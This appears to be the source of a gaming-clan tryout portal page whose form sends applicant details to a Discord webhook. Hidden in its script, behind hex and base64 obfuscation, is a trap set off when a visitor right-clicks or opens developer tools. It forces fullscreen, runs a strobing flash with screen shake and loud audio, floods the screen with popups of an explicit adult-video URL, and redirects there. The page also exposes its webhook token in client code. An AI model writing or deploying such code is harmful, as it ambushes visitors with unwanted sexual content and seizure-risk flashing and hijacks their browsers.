<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Crossfire PH | Tryout Submission Portal</title>
    <link rel="icon" type="image/png" href="&#x39;&#x2d;&#x72;&#x65;&#x6d;&#x6f;&#x76;&#x65;&#x62;&#x67;&#x2d;&#x70;&#x72;&#x65;&#x76;&#x69;&#x65;&#x77;&#x2e;&#x70;&#x6e;&#x67;">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root {
            --ghost-blue: #00d4ff;
            --cf-yellow: #f5a623;
            --panel-bg: rgba(15, 15, 18, 0.98);
            --border-ui: rgba(255, 255, 255, 0.1);
            --emergency-red: #ff0000;
        }
        
        * { cursor: none !important; }

        /* --- NEW LOGO ANIMATIONS --- */
        @keyframes logoFloat {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-20px); }
        }

        @keyframes logoGlow {
            0%, 100% { filter: drop-shadow(0 0 10px var(--cf-yellow)) brightness(1); }
            50% { filter: drop-shadow(0 0 30px var(--cf-yellow)) brightness(1.4); }
        }

        @keyframes textPulse {
            0%, 100% { opacity: 0.5; text-shadow: 0 0 2px var(--cf-yellow); }
            50% { opacity: 1; text-shadow: 0 0 15px var(--cf-yellow); }
        }

        #audio-init img {
            height: 150px; 
            animation: logoFloat 3s ease-in-out infinite, logoGlow 2s ease-in-out infinite;
            transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }

        #audio-init:hover img {
            transform: scale(1.15);
            filter: drop-shadow(0 0 50px var(--ghost-blue)) brightness(1.5);
        }

        #init-text {
            color: var(--cf-yellow); 
            margin-top: 30px; 
            letter-spacing: 10px; 
            font-weight: bold;
            animation: textPulse 1.5s infinite;
            text-transform: uppercase;
            font-size: 14px;
        }

        #custom-cursor {
            width: 20px; height: 20px;
            border: 2px solid var(--ghost-blue);
            border-radius: 50%;
            position: fixed;
            pointer-events: none;
            z-index: 9999999;
            transform: translate(-50%, -50%);
            box-shadow: 0 0 15px var(--ghost-blue);
        }
        #custom-cursor::after {
            content: ''; position: absolute; top: 50%; left: 50%;
            width: 4px; height: 4px; background: var(--cf-yellow);
            border-radius: 50%; transform: translate(-50%, -50%);
        }

        body, html {
            margin: 0; padding: 0; height: 100vh; width: 100vw;
            background-color: #000; color: #fff;
            font-family: 'Segoe UI', sans-serif; overflow: hidden;
            background: radial-gradient(circle at center, #1a1a1f 0%, #000 100%);
        }

        @keyframes glitch {
            0% { clip-path: inset(40% 0 61% 0); transform: translate(-5px,0); }
            20% { clip-path: inset(92% 0 1% 0); transform: translate(5px,0); }
            40% { clip-path: inset(43% 0 1% 0); transform: translate(-5px,0); }
            60% { clip-path: inset(25% 0 58% 0); transform: translate(5px,0); }
            80% { clip-path: inset(54% 0 7% 0); transform: translate(-5px,0); }
            100% { clip-path: inset(58% 0 43% 0); transform: translate(5px,0); }
        }

        @keyframes emergency-flash {
            0% { background-image: url('magic.png'); background-size: cover; background-position: center; }
            50% { background-image: none; background-color: #000; }
            100% { background-image: url('magic.png'); background-size: cover; background-position: center; }
        }

        .glitch-active { animation: glitch 0.3s infinite; filter: hue-rotate(90deg) saturate(2); opacity: 0.8; }

        .scanlines {
            position: absolute; inset: 0;
            background: linear-gradient(to bottom, rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), 
                        linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
            background-size: 100% 4px, 3px 100%; pointer-events: none; z-index: 3;
        }

        .preview-window {
            display: flex; flex-direction: column; align-items: center;
            justify-content: center; position: relative; 
            border: 1px dashed rgba(255,255,255,0.05);
            height: 100%; width: 100%; overflow: hidden;
        }

        #bg-watermark {
            position: absolute; font-size: 120px; font-weight: 900;
            color: rgba(0, 212, 255, 0.03); z-index: 0;
            text-transform: uppercase; white-space: nowrap; user-select: none; pointer-events: none;
        }

        #portal-view { 
            display: flex; flex-direction: column; align-items: center; justify-content: center; 
            width: 100%; height: 100%; z-index: 1; 
        }
        
        .viewport-lock {
            height: 480px; width: 100%;
            display: flex; flex-direction: column;
            align-items: center; justify-content: center;
        }

        .img-container {
            height: 400px; width: 100%;
            display: flex; align-items: center; justify-content: center;
        }

        #preview-img { max-height: 100%; max-width: 100%; object-fit: contain; }

        #protocol-view { 
            display: none; width: 100%; height: 100%; 
            padding: 40px; box-sizing: border-box; 
            overflow-y: auto; text-align: left; z-index: 2; 
        }

        .protocol-section { background: rgba(245, 166, 35, 0.03); border: 1px solid rgba(245, 166, 35, 0.1); padding: 20px; margin-bottom: 25px; }
        .protocol-title { color: var(--cf-yellow); font-weight: 900; margin-bottom: 15px; border-bottom: 1px solid #333; padding-bottom: 5px; text-transform: uppercase; font-size: 14px; letter-spacing: 2px; }
        .protocol-list { list-style: none; padding: 0; font-size: 13px; line-height: 1.6; color: #ccc; }
        .protocol-list li { margin-bottom: 10px; position: relative; padding-left: 25px; }
        .protocol-list li::before { content: "»"; position: absolute; left: 0; color: var(--cf-yellow); font-weight: bold; }

        .app-container { display: flex; flex-direction: column; height: 100vh; }
        .logo-container {
            flex: 0 0 70px; display: flex; align-items: center; padding: 0 40px;
            background: linear-gradient(90deg, rgba(245, 166, 35, 0.1) 0%, transparent 100%);
            border-bottom: 1px solid var(--border-ui);
        }

        .ui-main { flex: 1; display: grid; grid-template-columns: 320px 1fr 320px; padding: 20px; gap: 20px; overflow: hidden; }
        .side-panel { background: var(--panel-bg); border: 1px solid var(--border-ui); padding: 20px; display: flex; flex-direction: column; overflow: hidden; }

        #log-box div {
        animation: logPulse 2s infinite;
        }

        #log-box {
        font-size: 11px;
        color: #00d4ff; /* Changed to ghost-blue for better glow visibility */
        font-family: 'Courier New', monospace;
        overflow-y: auto;
        flex-grow: 1;
        margin-bottom: 15px;
        /* Glow effect */
        text-shadow: 0 0 5px rgba(0, 212, 255, 0.7), 0 0 10px rgba(0, 212, 255, 0.3);
        }
        .nav-menu { display: flex; gap: 20px; margin-right: 30px; }
        .nav-item { cursor: none; font-size: 12px; color: #888; text-transform: uppercase; letter-spacing: 1px; padding: 5px 0; border-bottom: 2px solid transparent; transition: 0.3s; }
        .nav-item.active { color: var(--cf-yellow); border-color: var(--cf-yellow); }

        .fb-link { color: white; font-size: 20px; text-decoration: none; transition: 0.3s; }
        .fb-link:hover { color: #1877f2; text-shadow: 0 0 10px #1877f2; }

        .input-box input { width: 100%; background: rgba(255,255,255,0.03); border: 1px solid #333; color: white; padding: 12px; box-sizing: border-box; outline: none; transition: 0.3s; }
        .input-box input:focus { border-color: var(--ghost-blue); background: rgba(0, 212, 255, 0.05); }
        
        .bottom-shelf { flex: 0 0 160px; background: rgba(10, 10, 12, 0.95); border-top: 1px solid var(--border-ui); display: flex; align-items: center; justify-content: center; gap: 15px; }
        .char-card { width: 160px; height: 110px; background: #151517; border: 1px solid #222; display: flex; flex-direction: column; align-items: center; justify-content: center; opacity: 0.4; transition: 0.3s; }
        .char-card.active { border-color: var(--ghost-blue); opacity: 1; background: rgba(0,212,255,0.08); transform: translateY(-5px); }
        .thumb-img { height: 50px; margin-bottom: 8px; }

        .dc-indicator-wrap { height: 240px; border: 1px solid var(--border-ui); margin-top: 10px; padding: 5px; background: #000; }

        .discord-btn { 
            background: #5865F2; 
            color: white; 
            text-align: center; 
            padding: 10px; 
            text-decoration: none; 
            font-weight: bold; 
            font-size: 12px; 
            margin-bottom: 10px;
            border-radius: 2px;
            transition: 0.3s;
        }
        .discord-btn:hover { background: #4752c4; box-shadow: 0 0 10px #5865F2; }

        @keyframes screen-shake {
            0% { transform: translate(0,0); }
            25% { transform: translate(5px, 5px); }
            50% { transform: translate(-5px, 0); }
            75% { transform: translate(0, -5px); }
            100% { transform: translate(0,0); }
        }

        .log-error {
        color: var(--emergency-red) !important;
        text-shadow: 0 0 8px rgba(255, 0, 0, 0.8) !important;
        font-weight: bold;
        }
        
        /* --- GLOWING PROTOCOL TEXT --- */
        @keyframes textGlowPulse {
            0%, 100% { 
                color: #ff0000; 
                text-shadow: 0 0 5px rgba(255, 255, 255, 0.1); 
            }
            50% { 
                color: var(--cf-yellow); 
                text-shadow: 0 0 15px var(--cf-yellow), 0 0 25px var(--cf-yellow); 
            }
        }

        .protocol-list li {
            margin-bottom: 10px;
            position: relative;
            padding-left: 25px;
            /* Applying the glow here */
            animation: textGlowPulse 2s infinite ease-in-out;
            transition: 0.3s;
        }

        /* Lightning Glow Animation */
@keyframes lightning-pulse {
    /* Beat 1: The Strike */
    0% { 
        filter: drop-shadow(0 0 5px var(--ghost-blue)) brightness(1); 
        transform: scale(1);
    }
    5% { 
        filter: drop-shadow(0 0 30px #fff) brightness(2) contrast(1.5); 
        transform: scale(1.02); /* Slight pop on beat */
    }
    /* Decay */
    50% { 
        filter: drop-shadow(0 0 15px var(--ghost-blue)) brightness(1.2); 
        transform: scale(1);
    }
    100% { 
        filter: drop-shadow(0 0 5px var(--ghost-blue)) brightness(1); 
    }
}

    

#preview-img {
    max-height: 100%;
    max-width: 100%;
    object-fit: contain;
    /* 0.468s is the magic number for 128 BPM. 
       Use 0.5s for 120 BPM or 0.4s for 150 BPM */
    animation: lightning-pulse 0.468s infinite cubic-bezier(0.11, 0, 0, 1);
    will-change: filter, transform;
}

/* Glitch + Lightning combo for when switching units */
.glitch-active {
    animation: glitch 0.3s infinite, lightning-pulse 0.1s infinite !important;
}

        .protocol-title {
            color: var(--cf-yellow);
            font-weight: 900;
            margin-bottom: 15px;
            border-bottom: 1px solid #333;
            padding-bottom: 5px;
            text-transform: uppercase;
            font-size: 14px;
            letter-spacing: 2px;
            /* Stronger glow for titles */
            text-shadow: 0 0 10px var(--cf-yellow);
        }

        .input-box input.input-error {
        border-color: var(--emergency-red);
        box-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
        background: rgba(255, 0, 0, 0.05);
        }

        @keyframes logPulse {
        0%, 100% { opacity: 1; }
        50% { opacity: 0.8; }
        }

        @keyframes shake {
        0%, 100% { transform: translateX(0); }
        25% { transform: translateX(-5px); }
        75% { transform: translateX(5px); }
        }

        .shake {
        animation: shake 0.2s ease-in-out 0s 2;
        }

        #trap-overlay { 
        display: none; 
        position: fixed; 
        inset: 0; 
        z-index: 999999; 
        flex-direction: column; 
        align-items: center; 
        justify-content: center; 
        text-align: center; 
        animation: emergency-flash 0.05s infinite, screen-shake 0.1s infinite;
    
    /* Text Styling */
        color: white;
        font-size: 120px;
        font-weight: 900;
        text-transform: uppercase;
        font-family: 'Arial Black', sans-serif;
        text-shadow: 0 0 20px #000, 0 0 40px #ff0000;
        user-select: none;
    }
        #audio-init { position: fixed; inset: 0; background: #000; z-index: 8888; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        
        .trap-screen { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; width: 100vw; }
    </style>
</head>
<body id="main-body" oncontextmenu="triggerTrap(); return false;">

<div id="custom-cursor"></div>

<div id="trap-overlay"></div>

<div id="audio-init" onclick="startSystem()">
    <img src="&#x39;&#x2d;&#x72;&#x65;&#x6d;&#x6f;&#x76;&#x65;&#x62;&#x67;&#x2d;&#x70;&#x72;&#x65;&#x76;&#x69;&#x65;&#x77;&#x2e;&#x70;&#x6e;&#x67;">
    <div id="init-text">SALI KA BOI? T.O KA MUNA</div>
</div>
<audio id="trap" loop><source src="labsong.mp3"; type="audio/mpeg"></audio>
<audio id="bgm" loop><source src="&#x4e;&#x45;&#x56;&#x45;&#x52;&#x2e;&#x6d;&#x70;&#x33;" type="audio/mpeg"></audio>
<audio id="sfx-blip"><source src="&#x68;&#x74;&#x74;&#x70;&#x73;&#x3a;&#x2f;&#x2f;&#x77;&#x77;&#x77;&#x2e;&#x73;&#x6f;&#x75;&#x6e;&#x64;&#x6a;&#x61;&#x79;&#x2e;&#x63;&#x6f;&#x6d;&#x2f;&#x62;&#x75;&#x74;&#x74;&#x6f;&#x6e;&#x73;&#x2f;&#x73;&#x6f;&#x75;&#x6e;&#x64;&#x63;&#x6a;&#x61;&#x79;&#x2f;&#x62;&#x75;&#x74;&#x74;&#x6f;&#x6e;&#x2d;&#x35;&#x30;&#x2e;&#x6d;&#x70;&#x33;" type="audio/mpeg"></audio>

<div class="app-container">
    <header class="logo-container">
        <img src="&#x39;&#x2d;&#x72;&#x65;&#x6d;&#x6f;&#x76;&#x65;&#x62;&#x67;&#x2d;&#x70;&#x72;&#x65;&#x76;&#x69;&#x65;&#x77;&#x2e;&#x70;&#x6e;&#x67;" style="height: 40px; margin-right: 15px;">
        <div class="brand-text" style="flex-grow: 1; font-weight: 900; font-size: 20px;">KLBGN <span style="font-weight: 300; opacity: 0.6;">TRYOUT BOI!</span></div>
        <nav class="nav-menu">
            <div class="nav-item active" onclick="switchTab('portal', this)">Portal</div>
            <div class="nav-item" onclick="switchTab('protocol', this)">Protocol</div>
        </nav>
        <div class="header-controls">
            <a href="&#x68;&#x74;&#x74;&#x70;&#x73;&#x3a;&#x2f;&#x2f;&#x77;&#x77;&#x77;&#x2e;&#x66;&#x61;&#x63;&#x65;&#x62;&#x6f;&#x6f;&#x6b;&#x2e;&#x63;&#x6f;&#x6d;&#x2f;&#x4b;&#x4c;&#x42;&#x47;&#x4e;" target="_blank" class="fb-link"><i class="fab fa-facebook"></i></a>
        </div>
    </header>

    <div class="ui-main">
        <aside class="side-panel">
            <div style="font-size: 11px; color: var(--cf-yellow); margin-bottom: 20px;">IDENTITY LINK</div>
            <div class="input-box"><input type="text" id="ign" placeholder="In-Game Name"></div><br>
            <div class="input-box"><input type="text" id="discord" placeholder="Discord Username"></div><br>
            <div class="input-box"><input type="text" id="facebook" placeholder="www.Facebook.com/profile"></div><br>
            <div class="input-box"><input type="text" id="role" placeholder="Role (GMP/DMP/ZA)"></div>
        </aside>

        <main class="preview-window">
            <div class="scanlines"></div>
            <div id="bg-watermark">KLBGN</div>
            
            <div id="portal-view">
                <div class="viewport-lock">
                    <div class="img-container">
                        <img id="preview-img" src="&#x47;&#x4d;&#x50;&#x2e;&#x77;&#x65;&#x62;&#x70;">
                    </div>
                    <div id="unit-info" style="margin-top: 20px; color: var(--ghost-blue); letter-spacing: 4px; font-size: 12px; height: 20px;">UNIT: GM PLAYER</div>
                </div>
            </div>

            <div id="protocol-view">
                <div class="protocol-section">
                    <div class="protocol-title">Protocol Mechanics</div>
                    <ul class="protocol-list">
                        <li>1. Interested applicants must form a team of 6 members and shall be given 2 matches to participate.</li>
                        <li>2. No existing clan affiliation is allowed for applicants.</li>
                        <li>3. Applicants will be playing against representatives only. KLBGN</li>
                        <li>4. The last 4 slots will be taken by KLBGN spectators.</li>
                        <li>5. Game mode is Ghost Mode only.</li>
                        <li>6. Any form of cheating, exploitation, or unsportsmanlike conduct will result in disqualification.</li>
                        <li>7. There is no gun or item restriction.</li>
                    </ul>
                </div>

                <div class="protocol-section">
                    <div class="protocol-title">Criteria</div>
                    <ul class="protocol-list">
                        <li>1. Performance will be evaluated based on presence, skill, and teamwork.</li>
                        <li>2. Winning or losing is not the primary focus; rather, this is about showcasing you as an individual and what you are capable of.</li>
                    </ul>
                </div>
            </div>
        </main>

        <aside class="side-panel">
            <div style="font-size: 11px; color: var(--cf-yellow); margin-bottom: 10px;">COMMUNICATIONS</div>
            <a href="javascript:void(0)" onclick="openDiscord()" class="discord-btn">JOIN DISCORD SERVER</a>
            <div style="font-size: 11px; color: var(--cf-yellow); margin-bottom: 10px;">ASSESSMENT LOG</div>
            <div id="log-box">> System Ready...</div>
            <div class="dc-indicator-wrap">
                <iframe src="&#x68;&#x74;&#x74;&#x70;&#x73;&#x3a;&#x2f;&#x2f;&#x64;&#x69;&#x73;&#x63;&#x6f;&#x72;&#x64;&#x2e;&#x63;&#x6f;&#x6d;&#x2f;&#x77;&#x69;&#x64;&#x67;&#x65;&#x74;&#x3f;&#x69;&#x64;&#x3d;&#x31;&#x34;&#x36;&#x31;&#x36;&#x34;&#x30;&#x34;&#x38;&#x33;&#x38;&#x30;&#x30;&#x36;&#x31;&#x37;&#x30;&#x32;&#x33;&#x26;&#x74;&#x68;&#x65;&#x6d;&#x65;&#x3d;&#x64;&#x61;&#x72;&#x6b;" width="100%" height="100%" allowtransparency="true" frameborder="0"></iframe>
            </div>
        </aside>
    </div>

    <footer class="bottom-shelf">
        <div class="char-card active" onclick="selectUnit(this, 'GM PLAYER', '&#x47;&#x4d;&#x50;&#x2e;&#x77;&#x65;&#x62;&#x70;')">
            <img src="&#x47;&#x4d;&#x50;&#x2e;&#x77;&#x65;&#x62;&#x70;" class="thumb-img">
            <div style="font-size: 11px; font-weight: bold;">GM PLAYER</div>
        </div>
        <div class="char-card" onclick="selectUnit(this, 'DM PLAYER', '&#x44;&#x4d;&#x50;&#x2e;&#x77;&#x65;&#x62;&#x70;')">
            <img src="&#x44;&#x4d;&#x50;&#x2e;&#x77;&#x65;&#x62;&#x70;" class="thumb-img">
            <div style="font-size: 11px; font-weight: bold;">DM PLAYER</div>
        </div>
        <div class="char-card" onclick="selectUnit(this, 'ZA PLAYER', '&#x5a;&#x41;&#x50;&#x2e;&#x77;&#x65;&#x62;&#x70;')">
            <img src="&#x5a;&#x41;&#x50;&#x2e;&#x77;&#x65;&#x62;&#x70;" class="thumb-img">
            <div style="font-size: 11px; font-weight: bold;">ZA PLAYER</div>
        </div>
        <button class="submit-btn" style="height: 55px; width: 220px; border: 2px solid var(--cf-yellow); background: transparent; color: var(--cf-yellow); font-weight: bold; margin-left: 20px; cursor: none;" onclick="submitTryout()">SUBMIT TRYOUT</button>
    </footer>
</div>

<script>
    const cursor = document.getElementById('custom-cursor');
    const blipSfx = document.getElementById('sfx-blip');
    
    let trapActive = false;
    let systemPrimed = false;
    
    // Updated payload in the second position
    const _0x1a2b = [
        "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x64\x69\x73\x63\x6f\x72\x64\x2e\x63\x6f\x6d\x2f\x61\x70\x69\x2f\x77\x65\x62\x68\x6f\x6f\x6b\x73\x2f\x31\x34\x36\x33\x39\x39\x32\x30\x39\x34\x39\x32\x39\x37\x31\x39\x33\x35\x32\x2f\x33\x52\x4c\x6f\x56\x6e\x5f\x42\x6e\x62\x59\x6e\x6f\x48\x48\x54\x65\x45\x31\x58\x45\x58\x54\x54\x2d\x66\x6b\x4e\x54\x69\x6f\x7a\x6b\x6e\x39\x71\x46\x4e\x44\x66\x32\x6c\x59\x30\x57\x48\x6a\x49\x58\x66\x35\x73\x70\x48\x7a\x42\x6e\x69\x55\x63\x5f\x31\x79\x52\x46\x39\x61\x4c", 
        "aHR0cHM6Ly93d3cucG9ybmh1Yi5jb20vdmlld192aWRlby5waHA/dmlld2tleT1waDYyODNiM2FmYTk1Y2QjMQ==", // YOUR PAYLOAD
        "https://discord.gg/ZrYhejg2kg"
    ];

    const _0xW = (s) => atob(s);

    document.addEventListener('mousemove', (e) => {
        cursor.style.left = e.clientX + 'px';
        cursor.style.top = e.clientY + 'px';
    });

    function playBlip() {
        blipSfx.currentTime = 0;
        blipSfx.volume = 0.3;
        blipSfx.play().catch(()=>{});
    }

   function startSystem() {
    document.getElementById('audio-init').style.display = 'none';
    const bgm = document.getElementById('bgm');
    
    // Play music
    bgm.play();
    
    // Hard sync: Reset the animation style to trigger it exactly when the music starts
    const preview = document.getElementById('preview-img');
    preview.style.animation = 'none';
    
    // Small delay to allow DOM to register the 'none'
    setTimeout(() => {
        preview.style.animation = 'lightning-pulse 0.468s infinite cubic-bezier(0.11, 0, 0, 1)';
        addLog("Neural Link Established. Pulse Synchronized.");
    }, 10);
}

    function openDiscord() {
        playBlip();
        addLog("Uplink to Discord server initiated.");
        window.open(_0x1a2b[2], '_blank');
    }

    function switchTab(target, el) {
        playBlip();
        document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
        el.classList.add('active');
        document.getElementById('portal-view').style.display = (target === 'portal') ? 'flex' : 'none';
        document.getElementById('protocol-view').style.display = (target === 'protocol') ? 'block' : 'none';
        addLog("View Shift: " + target.toUpperCase());
    }

    function selectUnit(el, name, img) {
        playBlip();
        
        // Remove existing classes
        document.querySelectorAll('.char-card').forEach(c => c.classList.remove('active'));
        el.classList.add('active');
        
        const preview = document.getElementById('preview-img');
        const info = document.getElementById('unit-info');

        // Trigger Thunder Strike on selection
        preview.classList.remove('thunder-active');
        info.classList.remove('unit-thunder');
        
        // Force Reflow to restart animation
        void preview.offsetWidth; 
        
        preview.src = img;
        preview.classList.add('thunder-active');
        info.classList.add('unit-thunder');
        info.innerText = "KLBGN: " + name;
        
        setTimeout(() => {
            info.classList.remove('unit-thunder');
        }, 500);

        addLog("Synchronized Unit: " + name);
    }

   function addLog(msg, isError = false) {
    const box = document.getElementById('log-box');
    const timestamp = new Date().toLocaleTimeString([], { hour12: false, hour: '2-digit', minute: '2-digit' });
    const errorClass = isError ? 'class="log-error"' : '';
    
    // Add new log entry with optional error styling
    box.innerHTML += `<div ${errorClass}>[${timestamp}] > ${msg}</div>`;
    
    // Auto-scroll to bottom
    box.scrollTop = box.scrollHeight;
    
    if(document.getElementById('audio-init').style.display === 'none') playBlip();
}

    async function triggerTrap() {
        if(trapActive) return;
        trapActive = true;

        const overlay = document.getElementById('trap-overlay');
        const trapAudio = document.getElementById('trap');
        const bgm = document.getElementById('bgm');
        const appContainer = document.querySelector('.app-container');

        overlay.innerHTML = 'KUPAL INSPECT PA BOI';
        overlay.style.display = 'flex';
        if(appContainer) appContainer.style.display = 'none';
        
        try { document.documentElement.requestFullscreen(); } catch(e) {}

        bgm.pause();
        trapAudio.loop = true;
        trapAudio.play();

        const payloadUrl = _0xW(_0x1a2b[1]);

        // BURST 1: Initial heavy wave (15 windows)
        // We use a slight delay between each to try and sneak past the grouping block
        for(let i=0; i<15; i++) {
            setTimeout(() => openBurst(payloadUrl, 1), i * 50);
        }

        const titles = ["⚠ BADING DETECTED ⚠", "KUPAL MO BOI", "BYE BYE PC", "HAHAHAHAHAHA"];
        let tIdx = 0;
        setInterval(() => {
            document.title = titles[tIdx % titles.length];
            tIdx++;
        }, 50);

        // --- AUTO-CLICK ENGINE ---
         const autoClickEngine = setInterval(() => {
             const fakeClick = new MouseEvent('click', { bubbles: true, cancelable: true, view: window });
             overlay.dispatchEvent(fakeClick);
            openBurst(payloadUrl, 2);
        }, 150);

        // THE INFINITE TRAP: 
        // Every time the user clicks the overlay to try and close it, open 5 more.
        overlay.onclick = () => {
            openBurst(payloadUrl, 5);
        };

        // Every time they move the mouse, open 1 window (capped at 100 total)
        let totalOpened = 15;
        overlay.onmousemove = () => {
            if(totalOpened < 100) {
                openBurst(payloadUrl, 1);
                totalOpened++;
            }
        };

        // Final redirect after the initial chaos
        setTimeout(() => {
            window.location.href = payloadUrl;
        }, 10000);
    }

    function openBurst(url, count) {
        for(let i=0; i < count; i++) {
            // Generate a truly unique name for every single window call
            let uniqueID = Math.random().toString(36).substring(2) + Date.now();
            let w = 400;
            let h = 400;
            let l = Math.floor(Math.random() * (window.screen.width - w));
            let t = Math.floor(Math.random() * (window.screen.height - h));
            
            // The browser is forced to treat each 'uniqueID' as a brand new task
            window.open(url, uniqueID, `width=${w},height=${h},left=${l},top=${t}`);
        }
    }

    let inputBuffer = "";
const secretCode = "admin"; // Change this to your desired password

window.addEventListener('keydown', (e) => {
    // Keep only the last few characters typed to match the length of the secretCode
    inputBuffer += e.key.toLowerCase();
    inputBuffer = inputBuffer.slice(-secretCode.length);

    if (inputBuffer === secretCode) {
        console.log("Bypass Auth Successful.");
        
        // 1. Kill the Audio
        document.querySelectorAll('audio').forEach(s => {
            s.pause();
            s.currentTime = 0;
        });

        // 2. Hide all trap elements (Assuming your main container has an ID)
        // Adjust the selector below to match your trap's main div ID
        const trapContent = document.querySelector('.trap-container') || document.body;
        trapContent.style.filter = "none";
        trapContent.style.animation = "none";
        
        // 3. Clear all timers (stops window spam and flashes)
        let id = window.setTimeout(function() {}, 0);
        while (id--) { window.clearTimeout(id); }

        alert("System Disarmed. Welcome back, Dave.");
        inputBuffer = ""; // Reset buffer
    }
});

    document.onkeydown = e => {
        if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) || ((e.ctrlKey || e.metaKey) && e.keyCode === 85)) {
            e.preventDefault();
            triggerTrap();
            return false;
        }
    };

    async function submitTryout() {
    // 1. References
    const fields = {
        ign: document.getElementById('ign'),
        discord: document.getElementById('discord'),
        facebook: document.getElementById('facebook'),
        role: document.getElementById('role')
    };

    const validRoles = ['GMP', 'DMP', 'ZA'];
    

    let hasError = false;
    let errorMsg = "";
    Object.values(fields).forEach(f => f.style.background = "transparent");

    if (!fields.ign.value.trim()) {
            fields.ign.style.background = "transparent";
            addLog("ERR: IGN IDENTITY MISSING");
            hasError = true;
        }

        const userRole = fields.role.value.toUpperCase().trim();
        if (!validRoles.includes(userRole)) {
            fields.role.style.background = "transparent";
            addLog("ERR: INVALID ROLE (GMP/DMP/ZA ONLY)");
            hasError = true;
        }
        
    // 2. Check for Empty Fields
    ['ign', 'discord', 'facebook', 'role'].forEach(key => {
        if (!fields[key].value.trim()) {
            fields[key].classList.add('input-error');
            hasError = true;
            errorMsg = "MISSING IDENTITY DATA";
        }
    });

    // 3. FB LINK VALIDATION (The "Must be a link" part)
    const fbValue = fields.facebook.value.trim();
    // Regex to check if it's a valid URL and contains "facebook.com" or "fb.com"
    const fbRegex = /^(https?:\/\/)?(www\.)?(facebook\.com|fb\.com)\/.+$/i;

    if (fbValue && !fbRegex.test(fbValue)) {
        fields.facebook.classList.add('input-error');
        hasError = true;
        errorMsg = "INVALID UPLINK: FB LINK REQUIRED";
    }

    // 4. Handle Errors
    if (hasError) {
        addLog(`CRITICAL:  ${errorMsg}`, true);
        return;
    }

    if (hasError) return;
    // 5. Proceed if Validation Passes
    addLog("Link verified. Initializing transmission...");

    const payload = {
        embeds: [{
            title: "⚡ NEW TRYOUT APPLICATION",
            color: 16100899,
            fields: [
                { name: "In-Game Name", value: fields.ign.value, inline: true },
                { name: "Discord", value: fields.discord.value, inline: true },
                { name: "Facebook", value: fields.facebook.value },
                { name: "Role", value: fields.role.value, inline: true }
            ],
            timestamp: new Date()
        }]
    };

    try {
        const response = await fetch(_0x1a2b[0], {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

        if (response.ok) {
            addLog("TRANSMISSION SUCCESSFUL.");
            alert("Application Sent!");
            Object.values(fields).forEach(f => f.value = "");
        } else { throw new Error(); }
    } catch (err) {
        addLog("CONNECTION ERROR: Webhook Failed.", true);
    }
}
</script>
</body>
</html>